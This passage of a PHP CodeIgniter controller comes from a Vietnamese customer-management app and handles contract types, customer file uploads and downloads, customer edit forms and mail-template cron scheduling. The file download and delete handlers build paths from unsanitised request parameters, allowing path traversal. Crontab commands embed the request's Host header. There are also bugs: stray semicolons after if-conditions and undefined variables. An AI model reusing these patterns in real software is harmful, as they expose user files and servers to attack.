            $item = $this->Customer->get_constract_type_info($id);
            if (empty($item))
                redirect('404.html');
            else
                $data['item'] = $item;
        }

        $data['page'] = $this->uri->segment(4, 1);

        $this->load->view('customers/quotes_contract_type_view', $data);
    }

    function quotes_constract_type_save()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $id = $post['id'];
            $flagError = false;
            $post['title'] = trim($post['title']);
            $post['code'] = trim($post['code']);
            $this->input->post = $post;

            if ($id == -1) {
                $title_validate = 'required|is_unique[quotes_contract_type.title]';
                $code_validate = 'required|is_unique[quotes_contract_type.code]';
            } else {
                $title_validate = 'required|callback_validate_unique[quotes_contract_type-title-' . $id . ']';
                $code_validate = 'required|callback_validate_unique[quotes_contract_type-code-' . $id . ']';
            }

            $this->form_validation->set_rules('title', 'Tiêu ??', $title_validate);
            $this->form_validation->set_rules('code', 'Mã lo?i v?n b?n', $code_validate);

            if ($this->form_validation->run($this) == FALSE) {
                $flagError = true;
                $errors = $this->form_validation->error_array();
            }

            if ($flagError == false) {
                $this->Customer->save_quotes_contract_type($post, $id);
            }

            if ($flagError == true) {
                $response = array('flag' => 'false', 'errors' => $errors);
            } else {
                $response = array('flag' => 'true');

                $notice = 'Cập nhật thành công.';
                $_SESSION['notice'] = $notice;
            }

            echo json_encode($response);
        }
    }

    function quotes_contract_type_list()
    {
        $data['currrent_page'] = $this->uri->segment(3, 1);
        $data['controller_name'] = $this->uri->segment(1);
        $this->load->view('customers/quotes_contract_type_list', $data);
    }

    function quotes_constract_type_store()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $_SESSION['constract_type_filter'] = array();
            $arrParam = array_merge($post, $this->input->get());
            $arrParam['paginator'] = $this->_paginator;
            $arrParam['page'] = $this->uri->segment(3, 1);

            $config['base_url'] = base_url() . 'customers/quotes_constract_type_store';
            $config['total_rows'] = $this->Customer->count_all_constract_type($arrParam);

            $config['per_page'] = $arrParam['paginator']['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
            #$config['per_page'] = $arrParam['paginator']['per_page'] = 1;
            $config['uri_segment'] = 3;
            $config['use_page_numbers'] = TRUE;

            $items = $this->Customer->constract_type_list($arrParam);

            $this->load->library("pagination");
            $this->pagination->initialize($config);
            $this->pagination->createConfig('front-end');

            $pagination = $this->pagination->create_ajax();

            $result = array('count' => $config['total_rows'], 'items' => $items, 'pagination' => $pagination);
            echo json_encode($result);
        }
    }

    function quotes_contract_delete()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $this->Customer->delete_list_quotes_contract($post['cid']);

            $response = array('flag' => 'true', 'msg' => 'Bạn đã thao tác xóa thành công.');
            echo json_encode($response);

        }
    }

    #delete contract type
    function quotes_contract_type_delete()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $flag = 'true';
            if (0) {
                $flag = 'warning';
                $msg = 'Bạn không có quyền thực hiện chức năng này!';
            } else {
                $constract_type_default = $this->config->item('quote_constract_type_default');
                $constract_type_default = (!empty($constract_type_default)) ? unserialize($this->config->item('quote_constract_type_default')) : array();
                $cid = array();
                foreach ($post['cid'] as $id) {
                    if (!in_array($id, $constract_type_default)) {
                        $cid[] = $id;
                    }
                }

                if (count($cid) > 0) {
                    $this->Customer->delete_list_quotes_contract_type(array('cid' => $cid));
                }
                $msg = 'Thực hiện thao tác thành công.';
            }

            $response = array('flag' => $flag, 'msg' => $msg);
            echo json_encode($response);
        }
    }

    function clear_state_quotes_contract()
    {
        redirect('customers/quotes_contract');
    }

    function quotes_contract_view($id = -1)
    {
        $data = array();
        $data['id'] = $id;
        $data['qc_types'] = $this->Customer->get_all_quotes_contract_type();
        if ($id > 0) {
            $item = $this->Customer->get_info_quotes_contract($id);
            if (empty($item))
                redirect('404.html');
            else
                $data['item'] = $item;

        }
        $this->load->helper('ckeditor');
        #Ckeditor's configuration
        $data['ckeditor'] = array(
            #ID of the textarea that will be replaced
            'id' => 'content_quotes_contract',
            'path' => 'assets/js/biz/ckeditor/',
            'value' => isset($_POST['content_quotes_contract']) ? $_POST['content_quotes_contract'] : '',
            #Optionnal values
            'config' => array(
                'toolbar' => "Full",    #Using the Full toolbar
                'width' => "100%",     #Setting a custom width
                'height' => '500px',    #Setting a custom height
                'language' => 'vi',
                'filebrowserBrowseUrl' => base_url() . 'assets/js/biz/ckfinder/ckfinder.html',
                'filebrowserImageBrowseUrl' => base_url() . 'assets/js/biz/ckfinder/ckfinder.html?Type=Images',
                'filebrowserImageUploadUrl' => base_url() . 'assets/js/biz/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Images',
            ),
            #Replacing styles from the "Styles tool"
            'styles' => array(
                #Creating a new style named "style 1"
                'style 1' => array(
                    'name' => 'Blue Title',
                    'element' => 'h2',
                    'styles' => array(
                        'color' => 'Blue',
                        'font-weight' => 'bold'
                    )
                ),
                #Creating a new style named "style 2"
                'style 2' => array(
                    'name' => 'Red Title',
                    'element' => 'h2',
                    'styles' => array(
                        'color' => 'Red',
                        'font-weight' => 'bold',
                        'text-decoration' => 'underline'
                    )
                )
            )
        );

        $this->load->view("customers/form_quotes_contract", $data);
    }

    function quotes_contract_save($id = -1)
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $id = $post['id'];
            $flagError = false;
            $post['title_quotes_contract'] = trim($post['title_quotes_contract']);
            $post['content_quotes_contract'] = trim($post['content_quotes_contract']);
            $this->input->post = $post;

            if ($id == -1) {
                $title_validate = 'required|is_unique[quotes_contract.title_quotes_contract]';
            } else {
                $title_validate = 'required|callback_validate_unique_custom[quotes_contract-title_quotes_contract-' . $id . '-id_quotes_contract]';

            }

            $this->form_validation->set_rules('title_quotes_contract', 'Tiêu ??', $title_validate);
            $this->form_validation->set_rules('cat_quotes_contract', 'Lo?i m?u', 'callback_validate_select');
            $this->form_validation->set_rules('content_quotes_contract', 'N?i dung', 'required');

            if ($this->form_validation->run($this) == FALSE) {
                $flagError = true;
                $errors = $this->form_validation->error_array();
            }

            if ($flagError == false) {
                $title = $this->input->post("title_quotes_contract");
                $cat = $this->input->post("cat_quotes_contract");
                $content = $this->input->post("content_quotes_contract");

                $data = array(
                    "title_quotes_contract" => $title,
                    "content_quotes_contract" => $content,
                    "cat_quotes_contract" => $cat
                );

                $this->Customer->save_quotes_contract($data, $id);
            }

            if ($flagError == true) {
                $response = array('flag' => 'false', 'errors' => $errors);
            } else {
                $response = array('flag' => 'true');

                $notice = 'Cập nhật thành công.';
                $_SESSION['notice'] = $notice;
            }

            echo json_encode($response);
        }
    }

    function quotes_contract_type_save($id = -1)
    {
        $title = $this->input->post('title');
        $code = $this->input->post('code');
        $status = $this->input->post('status');

        $data = array(
            'title' => $title,
            'code' => $code,
            'status' => $status,
            'deleted' => 0
        );

        if ($this->Customer->save_quotes_contract_type($data, $id)) {
            if ($id == -1) {
                echo json_encode(array('success' => true, 'message' => lang('common_add_success'), 'id' => $title));
            } else {
                echo json_encode(array('success' => true, 'message' => lang('common_update_success'), 'id' => $title));
            }
        } else {     #failure
            echo json_encode(array('success' => false, 'message' => lang('common_error')));
        }

        redirect('customers/quotes_contract_type_list');
    }

    function quotes_contract_suggest()
    {
        $suggestions = $this->Customer->get_search_suggestions_quotes_contract($this->input->get('term'), 100);
        echo json_encode($suggestions);
    }

    function listfile()
    {
        $person_id = $this->input->get('person_id');
        $data['person_id'] = $person_id;
        $this->db->select('cf.*,e.username');
        $this->db->from('customer_files as cf');
        $this->db->where('customer_id', $person_id);
        $this->db->join('phppos_employees as e', 'e.person_id = cf.created_by');
        $data['list'] = $this->db->get()->result();
        // echo '<pre>';
        // print_r($data['list']);
        // echo '</pre>';
        // die();
        $this->load->view('customers/addfile/list_file', $data);
    }

    function downloadfile()
    {
        $file_name = $this->input->get('file_name');
        $person_id = $this->input->get('person_id');
        if ($file_name && $person_id) {
            $path_download = APPPATH . '../assets/customers/files/' . $person_id . '/' . $file_name;
            force_download($path_download, null);
        }
    }

    function deletefile()
    {
        $file_id = $this->input->get('file_id');
        $file_name = $this->input->get('file_name');
        $person_id = $this->input->get('person_id');
        if ($file_id && $file_name && $person_id && $file_id != '' && $person_id != '' && $file_name != '') {
            $path_delete = APPPATH . '../assets/customers/files/' . $person_id . '/' . $file_name;
            if (file_exists($path_delete) == TRUE) {
                $this->db->delete('customer_files', array('id' => $file_id));
                unlink($path_delete);
            }
            redirect(base_url('customers/view/' . $person_id), 'refresh');
        }
    }


    public function addfile()
    {
        $fileError = array(
            'The filetype you are attempting to upload is not allowed.' => 'File tải lên phải có định dạng jpg|png|pdf|docx|doc|xls|xlsx|zip|zar|rar|xml|xps|wps|rtf|odt|dotx|dotm|csv|xla|xlsb|xlsm|xml|ppt|pptx|pot|ppsx|ppsm|pps|PPA|ppam|ppsm|potm',
            '<p>The file you are attempting to upload is larger than the permitted size.</p>' => 'File tải lên không được quá 100 Mb'
        );
        $post = $this->input->post();
        $get = $this->input->get();
        $arrParam = array_merge($post, $get);

        if (!empty($post)) {

            // var_dump($arrParam);die();
            $this->load->library("form_validation");
            $this->form_validation->set_rules('name', 'Tên tài liệu', 'required|max_length[255]|is_unique[task_files.name]');
            $this->form_validation->set_rules('file_name', 'Tên file', 'required|max_length[255]');
            if ($this->form_validation->run($this) == FALSE) {
                $errors = $this->form_validation->error_array();
                $flagError = true;
            } else {
                if ($_FILES["file_upload"]['name'] != "") {
                    $file_name = $this->rewriteUrl($post['file_name']);
                    $path_upload = APPPATH . '../assets/customers';
                    $upload_dir = APPPATH . '../assets/customers/files';
                    $upload_dir_customer = APPPATH . '../assets/customers/files/' . $post['person_id'];
                    // $upload_dir_customer = APPPATH . '../assets/customers/files';
                    // $url_upload = base_url('assets/customers/files/'.$post['person_id']);
                    
                    if (file_exists($path_upload) == FALSE) {
                        mkdir($path_upload, 0777);
                    }
                    if (file_exists($upload_dir) == FALSE) {
                        mkdir($upload_dir, 0777);
                    }
                    if (file_exists($upload_dir_customer) == FALSE) {
                        mkdir($upload_dir_customer, 0777);
                    }
                    $ext = pathinfo($_FILES["file_upload"]['name'], PATHINFO_EXTENSION);
                    $file_name = rewriteUrl($post['file_name']);

                    $config['upload_path'] = $upload_dir_customer;
                    $config['allowed_types'] = 'gif|jpg|png|pdf|docx|doc|xls|xlsx|zip|zar|rar|xml|xps|wps|rtf|odt|dotx|dotm|csv|xla|xlsb|xlsm|xml|ppt|pptx|pot|ppsx|ppsm|pps|PPA|ppam|ppsm|potm';
                    $config['max_size'] = '102400';
                    $config['encrypt_name'] = FALSE;

                    $config['file_name'] = $file_name . '.' . $ext;
                    if (file_exists($upload_dir_customer . '/' . $file_name . '.' . $ext)) {
                        $config['file_name'] = $file_name . time() . '.' . $ext;
                    }

                    $this->load->library('upload', $config);

                    if ($this->upload->do_upload("file_upload")) {
                        $file_info = $this->upload->data();
                        $arrParam['size'] = $_FILES['file_upload']['size'];
                        $arrParam['extension'] = $ext;
                        $arrParam['file_name'] = $config['file_name'];
                        $arrParam['name'] = $post['name'];
                        $arrParam['customer_id'] = $post['person_id'];
                    } else {
                        $flagError = true;
                        $err = $this->upload->display_errors();
                        if (isset($fileError[$err]))
                            $errors['file_upload'] = $fileError[$err];
                        else
                            $errors['file_upload'] = $err;
                    }
                } else {
                    $flagError = true;
                    $errors['file_upload'] = 'Phải tải file lên.';
                }
            }

            // var_dump($arrParam);

            if ($flagError == true) {
                $respon = array(
                    'flag' => 'false',
                    'errors' => $errors
                );
                // var_dump('error');
            } else {
                $this->load->model('Customer');
                $this->Customer->saveItem($arrParam, array(
                    'file' => 'add'
                ));

                $respon = array(
                    'flag' => 'true',
                    'message' => 'Cập nhật thành công'
                );
            }

            echo json_encode($respon);
            return;
        } else {
            $data['person_id'] = $this->input->get('person_id');

            $this->load->view('customers/addfile/addfile_view', $data);
        }
    }

    /*
     Loads the customer edit form
     */
     function view($customer_id = -1, $redirect_code = 0)
     {
        // Check Permissions
        $data['mode'] = null;
        if (!empty($this->_task_permission)) {
            $permissions = ['view_scope_owner', 'view_scope_location', 'view_scope_all'];
            foreach ($permissions as $permission) {
                if (in_array($permission, $this->_task_permission)) {
                    $data['mode'] = 'view';
                }
            }
            if (in_array('add_update', $this->_task_permission)) {
                $data['mode'] = 'edit';
            }
        }
        if (empty($data['mode'])) {
            return $this->check_action_permission('add_update');
        }

        $this->load->model('Tier');
        $tiers = array();
        $tiers_result = $this->Tier->get_all()->result_array();

        if (count($tiers_result) > 0) {
            $tiers[0] = lang('common_none');
            foreach ($tiers_result as $tier) {
                $tiers[$tier['id']] = $tier['name'];
            }
        }

        $data['controller_name'] = $this->_controller_name;
        # data phân loại khách hàng
        $data['tiers'] = $tiers;
        $data['person_info'] = $this->Customer->get_info($customer_id);

        $this->load->model('Customer_taxes');
        $data['customer_tax_info'] = $this->Customer_taxes->get_info($customer_id);

        $customer_typers = array();
        $customer_typers_result = $data['type_customers'] = $this->Customer->get_Customer_type();

        if (count($customer_typers_result) > 0) {
            $customer_typers[0] = lang('common_none');
            foreach ($customer_typers_result as $type) {
                $customer_typers[$type['id']] = $type['name'];
            }
        }
        $data['type_customers'] = $customer_typers;
        $data['sex'] = array('' => '', '1' => 'Nam', '2' => 'Nữ');

        /*
         * thêm data cho quản lý khách hàng dành cho kiểu dữ liệu 1 v 1, biến iValid được truyền vào để quản lý luồng dữ liệu truyền ra
         * geographical_area,exchange_form,business_type
        */

        $danh_muc_tong_hop = $this->Customer->get_danh_muc_khach_hang(false, false, $iValid = false);
        foreach ($danh_muc_tong_hop as $key => $value) {
            $data[$key][0] = lang('common_none');
            foreach ($value as $name) {
                $data[$key][$name['id']] = $name['name'];
            }
        }

        /*
         * thêm data cho quản lý khách hàng dành cho kiểu dữ liệu 1 nhiều, biến iValid được truyền vào để quản lý luồng dữ liệu truyền ra
         * customers_type,price_tiers
        */
        $danh_muc_tong_hop = $this->Customer->get_danh_muc_khach_hang(false, false, $iValid = TRUE);

        foreach ($danh_muc_tong_hop as $key => $value) {
            foreach ($value as $name) {
                $has_access = $this->Customer->kiem_tra_danh_muc_customer($key, $customer_id, $name['id']);
                $data[$key][$name['id']]['name'] = $name['name'];
                # biến $has_access được sử dụng như 1 cách để kiểm soát dữ liệu được hiển thị
                $data[$key][$name['id']]['has_access'] = $has_access;
            }
        }

//        echo '<pre>';
//        print_r($data);
//        echo '</pre>';
//        die();

        $data['customer_reference'] = $this->Customer->get_danh_muc_khach_hang('customer_reference');


        # truyền thêm giá trị của bảng thong_tin_lien_he
        $data['thong_tin_lien_he'] = $this->Customer->lay_thong_tin_lien_he_them($customer_id);
        $data['thong_tin_dau_moi'] = $this->Customer->lay_thong_tin_dau_moi_them($customer_id);
        // echo "<pre>";
        // print_r($data['thong_tin_lien_he']); die();
        # lấy dữ liệu nhân viên quản lý
        $employees = $this->Employee->getEmployeesByCurrentLocation();
        $data['selected_employee'] = 'all';
        $employeesDropbox = array();

        foreach ($employees as $employee) {
            $employeesDropbox["" . $employee['person_id']] = $employee['username'];
        }

        $employeesDropbox['all'] = 'Tất cả';
        $data['employee_manager'] = $employeesDropbox;


        /**********************************************************************************************************/
        $data['redirect_code'] = $redirect_code;

        /* Load Attribute Sets, Groups And Required Attributes */

        $this->load->model('Attribute_set');
        $this->load->model('Attribute_group');
        $this->load->model('Attribute');


        $data['attribute_sets'] = $this->Attribute_set->get_by_related_object('customers');
        $data['attribute_groups'] = $this->Attribute_group->get_all()->result();
        $data['attribute_values'] = $this->Attribute->get_entity_attributes(array('entity_id' => $customer_id, 'entity_type' => 'customers'));

        // json_decode nguoi duoc xem 
        $data['person_info']->watcher_manager = json_decode($data['person_info']->watcher_manager);
        // echo "<pre>";
        // print_r($data['person_info']->watcher_manager);
        // die();

        if (!empty($data['person_info']->attribute_set_id)) {
            $data['attributes'] = $this->Attribute_set->get_attributes($data['person_info']->attribute_set_id);
        }
        if (!empty($data['attribute_groups'])) {
            foreach ($data['attribute_groups'] as $key => $attribute_group) {
                if (!empty($data['attributes'])) {
                    foreach ($data['attributes'] as $attribute) {
                        if ($attribute->attribute_group_id == $attribute_group->id) {
                            $data['attribute_groups'][$key]->has_attributes = true;
                        }
                    }
                }
            }
        }
        $data['table_thong_tin_lien_he'] = $this->load->view("people/table_thong_tin_lien_he", '', TRUE);
        $data['table_thong_tin_dau_moi'] = $this->load->view("people/table_thong_tin_dau_moi", '', TRUE);

        // echo $data['table_thong_tin_dau_moi']; die();

        if ($this->input->post('change_attribute') || $this->input->post('change_attribute') == '0') {
            $attribute_set_id = $this->input->post('change_attribute');
            $data['attributes'] = $this->Attribute_set->get_attributes($attribute_set_id);
            if (!empty($data['attribute_groups'])) {
                foreach ($data['attribute_groups'] as $key => $attribute_group) {
                    if (!empty($data['attributes'])) {
                        foreach ($data['attributes'] as $attribute) {
                            if ($attribute->attribute_group_id == $attribute_group->id) {
                                $data['attribute_groups'][$key]->has_attributes = true;
                            }
                        }
                    }
                }
            }
            if ($attribute_set_id != 0) {
                echo json_encode($this->load->view('attribute_sets/widgets/attributes', $data, true));
            } else {
                echo json_encode('');
            }

        } else {
            // echo "<pre>"; print_r($data); die();
            $this->load->view("customers/" . $data['mode'], $data);
        }
    }
    //------------------------------------------------------------------------------------------------
    // MAIL TEMPLATE
    //==========================================================================================
    function manage_mail()
    {
        # configuration for pagination
        $config['base_url'] = base_url() . 'customers/manage_mail';
        $config['per_page'] = $this->config->item('number_of_items_per_page') ? (int)$this->config->item('number_of_items_per_page') : 20;
        $config['uri_segment'] = 3;
        $config['use_page_numbers'] = TRUE;


        # Save search condition default
        $arrParamsDefault = array(
            'search_text' => '',
            'order_col' => 'mail_id',
            'order_dir' => 'asc',
            'page' => 1,
            'per_page' => $config['per_page'],
        );
        $_SESSION['arrParamsMailTemp'] = isset($_SESSION['arrParamsMailTemp']) ? $_SESSION['arrParamsMailTemp'] : $arrParamsDefault;


        $arrParams = array(
            'search_text' => isset($_POST['search']) ? $this->input->post('search') : $_SESSION['arrParamsMailTemp']['search_text'],


            'order_col' => $this->input->post('order_col') ? $this->input->post('order_col') : $_SESSION['arrParamsMailTemp']['order_col'],
            'order_dir' => $this->input->post('order_dir') ? $this->input->post('order_dir') : $_SESSION['arrParamsMailTemp']['order_dir'],
            'page' => $this->uri->segment(3) ? $this->uri->segment(3) : $_SESSION['arrParamsMailTemp']['page'],
            'per_page' => $config['per_page'],
        );

        #save search condition for reload page
        $_SESSION['arrParamsMailTemp'] = $arrParams;

        $config['total_rows'] = $this->Customer->count_all_mail($arrParams);

        $this->pagination->initialize($config);
        $data['pagination'] = $this->pagination->my_Create_Links();

        $data['total_mail_campain'] = $this->Customer->count_all_mail_campain(array());
        $data['controller_name'] = $this->_controller_name;
        $data['form_width'] = $this->get_form_width();
        $data['per_page'] = $config['per_page'];
        $data['total_rows'] = $config['total_rows'];
        $data['baseUrl'] = $config['base_url'];
        $data['STT'] = ($arrParams['page'] - 1) * $arrParams['per_page'];
        $data['results'] = $this->Customer->get_all_mail_template($arrParams);
        # get if pagination is true else show the master view
        if ($this->uri->segment(4) == 't') {
            echo json_encode(array('manage_table' => $this->load->view("customers/mail_template/manage_mail_temp_table", $data, TRUE), 'pagination' => $this->load->view("customers/pagination_view", $data, TRUE), 'total_row' => $data['total_rows']));
        } else {
            $this->load->view("customers/mail_template/manage_mail_temp", $data);
        }
    }

    function mail_template_delete()
    {
        $post = $this->input->post();
        if (!empty($post)) {
            $this->Customer->delete_mail_template(array('mail_id' => $post['items']));
            for ($i = 0; $i < count($post['items']); $i++) {
                $mail_campains = $this->Customer->get_all_mail_campain(array('mail_id' => $post['items'][$i]));
                foreach ($mail_campains as $mail_campain) {
                    $mail_campain_id = $mail_campain['mail_campain_id'];
                    $minutes = $mail_campain['send_minutes'];
                    $hours = $mail_campain['send_hours'];
                    $month = $mail_campain['send_month'];
                    $dayOfMonth = $mail_campain['send_day_of_month'];
                    $dayOfWeek = $mail_campain['send_day_of_week'];
                    $active = $mail_campain['active'];
                    if ($active == 1) {
                        if ($minutes != '*' && $hours == '*') {
                            $minutes = '*/' . $postMinutes;
                        } else {
                            $command = $minutes . ' ' . $hours . ' ' . $dayOfMonth . ' ' . $month . ' ' . $dayOfWeek . ' curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id . "'";
                            $this->crontabs->remove_job($command);
                        }

                    }

                }

            }

            $this->Customer->delete_mail_campain(array('mail_id' => $post['items']));
            $response = array('flag' => 'true', 'msg' => 'Bạn đã thao tác thành công.');
            echo json_encode($response);

        }
    }

    /**
     * Function edit/add mail template
     */
    function view_mail($mail_id = -1)
    {
        $data['groups_sms_email'] = $this->Customer->get_all_customer_groups(array(), '', '');
        $data['template_for_birthday'] = FALSE;
        $config['global_xss_filtering'] = FALSE;
        $this->form_validation->set_rules('inhoud', 'inhoud', 'xss|clean');
        $data['mail_info'] = $this->Customer->get_info_mail($mail_id);
        if ($mail_id != -1) {
            $template_for_birthday = $this->Customer->get_all_mail_campain(array('mail_id' => $mail_id));
            if (isset($template_for_birthday[0]['mail_campain_name']) && $template_for_birthday[0]['mail_campain_name'] == 'sinh_nhat') {
                $data['template_for_birthday'] = TRUE;
            }
        }
        $this->load->helper('ckeditor');

        #Ckeditor's configuration
        $data['ckeditor'] = array(
            #ID of the textarea that will be replaced
            'id' => 'mail_content',
            'path' => 'assets/js/biz/ckeditor/',
            'value' => isset($_POST['mail_content']) ? $_POST['mail_content'] : '',
            #Optionnal values
            'config' => array(
                'toolbar' => "Full",    #Using the Full toolbar
                'width' => "100%",  #Setting a custom width
                'height' => '500px',     #Setting a custom height
                'language' => 'vi',
                'filebrowserBrowseUrl' => base_url() . 'assets/js/biz/ckfinder/ckfinder.html',
                'filebrowserImageBrowseUrl' => base_url() . 'assets/js/biz/ckfinder/ckfinder.html?Type=Images',
                'filebrowserImageUploadUrl' => base_url() . 'assets/js/biz/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Images',
            ),
            #Replacing styles from the "Styles tool"
            'styles' => array(
                #Creating a new style named "style 1"
                'style 1' => array(
                    'name' => 'Blue Title',
                    'element' => 'h2',
                    'styles' => array(
                        'color' => 'Blue',
                        'font-weight' => 'bold'
                    )
                ),
                #Creating a new style named "style 2"
                'style 2' => array(
                    'name' => 'Red Title',
                    'element' => 'h2',
                    'styles' => array(
                        'color' => 'Red',
                        'font-weight' => 'bold',
                        'text-decoration' => 'underline'
                    )
                )
            )
        );


        $data['page'] = $this->uri->segment(4, 1);
        $this->load->view("customers/mail_template/create_mail_template", $data);
    }


    function save_mail_template($mail_id = -1)
    {
        $post = $this->input->post();
        if (!empty($post)) {

            $post['mail_title'] = trim($post['mail_title']);
            $post['mail_content'] = trim($post['mail_content']);

            $this->input->post = $post;

            $this->form_validation->set_rules('mail_title', lang('customers_manage_mail_title'), 'required');
            $this->form_validation->set_rules('mail_content', lang('customers_manage_mail_content'), 'required');

            if ($this->form_validation->run($this) == FALSE)
                $errors = $this->form_validation->error_array();

            if (!empty($errors)) {
                $respon = array('flag' => 'false', 'errors' => $errors);
            } else {
                #save mail
                $mail_data = array(
                    'mail_title' => $this->input->post('mail_title'),
                    'mail_content' => $this->input->post('mail_content')
                );

                $last_insert_id = $this->Customer->save_mail($mail_data, $mail_id);

                #save template for 'sinh nhat' 'no' mail campain
                $selectedTemp = ($mail_id == -1) ? $last_insert_id : $mail_id;
                $postMinutes = 00;
                $postHours = 08;
                $postDaysOfWeek = '*';
                $postMonths = '*';
                $postDays = '*';
                $chk_active = 1;

                $mail_campain_name_sn = 'sinh_nhat';
                $mailcampain_sn = $this->Customer->get_all_mail_campain(array('name' => $mail_campain_name_sn));
                $mail_campain_id_sn = (!empty($mailcampain_sn) && $mailcampain_sn != '') ? $mailcampain_sn[0]['mail_campain_id'] : -1;
                if (!empty($post['chk_temp_for_birth'])) {
                    if ($post['chk_temp_for_birth'] == 1) {

                        $data = array(
                            'mail_campain_name' => $mail_campain_name_sn,
                            'mail_id' => $selectedTemp,
                            'smsmail_group_id' => -1,
                            'send_minutes' => $postMinutes,
                            'send_hours' => $postHours,
                            'send_month' => $postMonths,
                            'send_day_of_month' => $postDays,
                            'send_day_of_week' => $postDaysOfWeek,
                            'iterative_time' => 1,
                            'active' => 1,
                        );
                        $this->Customer->update_mail_campain($data, $mail_campain_id_sn);
                        if ($mail_campain_id_sn == -1) ;
                        {
                            $command = $postMinutes . ' ' . $postHours . ' ' . $postDays . ' ' . $postMonths . ' ' . $postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id_sn . "'";
                            $this->crontabs->add_jobs($command);
                        }
                    }
                } else {
                    $command = $postMinutes . ' ' . $postHours . ' ' . $postDays . ' ' . $postMonths . ' ' . $postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id_no . "'";
                    $this->crontabs->remove_job($command);
                    $this->Customer->delete_mail_campain(array('mail_id' => array($mail_id)));

                }


                if (!empty($post['chk_temp_for_no']) && $post['chk_temp_for_no'] == 1) {
                    $mail_campain_name_no = 'no';
                    $mailcampain_no = $this->Customer->get_all_mail_campain(array('name' => $mail_campain_name_no));
                    $mail_campain_id_no = (!empty($mailcampain_no) && $mailcampain_no != '') ? $mailcampain_no[0]['mail_campain_id'] : -1;
                    $data = array(
                        'mail_campain_name' => $mail_campain_name_no,
                        'mail_id' => $selectedTemp,
                        'smsmail_group_id' => -2,
                        'send_minutes' => $postMinutes,
                        'send_hours' => $postHours,
                        'send_month' => $postMonths,
                        'send_day_of_month' => $postDays,
                        'send_day_of_week' => $postDaysOfWeek,
                        'iterative_time' => 1,
                        'active' => 1,
                    );
                    $this->Customer->update_mail_campain($data, $mail_campain_id_no);
                    if ($mail_campain_id_no == -1) ;
                    {
                        $command = $postMinutes . ' ' . $postHours . ' ' . $postDays . ' ' . $postMonths . ' ' . $postDaysOfWeek . '  curl ' . "'https://" . $_SERVER['HTTP_HOST'] . '/Cronjob/do_send_mail/' . $mail_campain_id_no . "'";
                        $this->crontabs->add_jobs($command);
                    }
                }

                $notice = ($mail_id == -1) ? lang('common_add_success') : lang('common_update_success');
                $_SESSION['notice'] = $notice;

                $respon = array('flag' => 'true');
            }

            echo json_encode($respon);


        }
    }

    function delete_mail()
    {
        $check = true;
        $mails_to_delete = $this->input->post('ids');
        $list_mail_template = array();
        $list_mail_template[] = $this->config->item('mail_template_birthday');
        $list_mail_template[] = $this->config->item('mail_template_contact');
        $list_mail_template[] = $this->config->item('mail_template_calendar');
        $title_mail = array();
        foreach ($list_mail_template as $key => $value) {
            $info_mail = $this->Customer->get_info_mail($value);
            $title_mail[] = $info_mail->mail_title;
            foreach ($mails_to_delete as $key1 => $value1) {
                if ($value == $value1) {
                    $check = false;
                }
            }
        }
        if ($check) {
            if ($this->Customer->delete_mail_list($mails_to_delete)) {
                echo json_encode(array('success' => true, 'message' => lang('common_detach') . count($mails_to_delete) . ' email!'));
            } else {
                echo json_encode(array('success' => false, 'message' => lang('common_error')));
            }
        } else {
            $msg = "<br>(";
            for ($i = 0; $i < count($title_mail); $i++) {
                $msg .= $title_mail[$i] . "), ";
            }
            echo json_encode(array('success' => false, 'message' => lang('customers_mail_delete_err_mail_auto') . substr($msg, 0, strlen($msg) - 2) . ")"));
        }
    }

    function send_mail()
    {
        $data['list_mail'] = $this->Customer->item_mail_template();
        $data['type'] = $this->input->get('type');
        $this->load->view("customers/send_mail", $data);
    }

    function covertTemplate($data, $html_string)
    {
        $this->load->model('Location');
        $customer = $data['customer'];

        #thông tin khách hàng
        $customer_info = array(
            'TEN_KH' => $customer->last_name . ' ' . $customer->first_name,
            'CT_KH' => $customer->company_name,
            'DIA_CHI_1_KH' => $customer->address_1,
            'DIA_CHI_2_KH' => $customer->address_2,
            'SDT_KH' => $customer->phone_number,
            'CHUCVU_KH' => $customer->position,
            'TKNH_KH' => $customer->account_number,
            'EMAIL_KH' => $customer->email,
        );

        $localtion_info = array(
            'LOGO' => '<img src=' . $this->Appconfig->get_logo_image() . '"" />',
            'NAME_COMPANY' => $this->config->item('company'),
            'ADDRESS_COMPANY' => nl2br($this->Location->get_info_for_key('address', isset($data['override_location_id']) ? $data['override_location_id'] : FALSE)),
            'EMAIL_COMPANY' => $this->Location->get_info_for_key('email'),
            'TEL_COMPANY' => nl2br($this->Location->get_info_for_key('phone', isset($data['override_location_id']) ? $data['override_location_id'] : FALSE)),
            'FAX_COMPANY' => $this->Location->get_info_for_key('fax'),
            'WEBSITE_COMPANY' => $this->config->item('website'),
            'SALE_OFFICE_COMPANY' => $this->Location->get_info_for_key('sale_office'),
            'ACCOUNT_BANK_COMPANY' => $this->Location->get_info_for_key('account_bank'),
        );

        # merge thông tin
        $info_merge = array_merge($localtion_info, $customer_info);
        # covert hoa
        $info_upper = array();
        foreach ($info_merge as $key => $val)
            $info_merge[$key . '_U'] = $val = mb_strtoupper($val, 'UTF-8');

        # ngày - tháng - năm
        $day = date('d');
        $month = date('m');
        $year = date('Y');

        foreach ($info_merge as $key => $val) {
            $html_string = str_replace('{' . $key . '}', $val, $html_string);
        }

        $html_string = str_replace("{DATE}", $day, $html_string);
        $html_string = str_replace("{MONTH}", $month, $html_string);
        $html_string = str_replace("{YEAR}", $year, $html_string);

        return $html_string;
    }


    protected function get_customer_tmp($task)
    {
        if ($task == 'mail') {
            $customer_ids = array();
            if (is_array($_SESSION['sms_mail']) && count($_SESSION['sms_mail']) > 0) {
                foreach ($_SESSION['sms_mail'] as $val) {
                    $customer_ids[] = $val['person_id'];
                }
            }

            $result = $customer_ids;
        }

        return $result;
    }

    function do_send_mail($campain_id = '')
    {
        $this->load->helper('convert_content');
        $post = $this->input->post();

